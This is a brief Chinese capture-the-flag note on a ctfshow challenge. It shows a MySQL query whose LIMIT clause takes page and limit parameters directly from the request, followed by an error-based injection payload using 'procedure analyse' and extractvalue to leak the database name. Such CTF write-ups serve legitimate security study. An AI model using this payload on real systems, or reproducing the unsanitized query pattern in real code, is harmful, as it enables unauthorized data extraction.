# 知识点
### procedure analyse
[https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html](https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html)
# 思路
```bash
$sql = select * from ctfshow_user limit ($page-1)*$limit,$limit;
```
```bash
?page=10&limit=10 procedure analyse(extractvalue(rand(),concat(0x3a,database())),1);
```
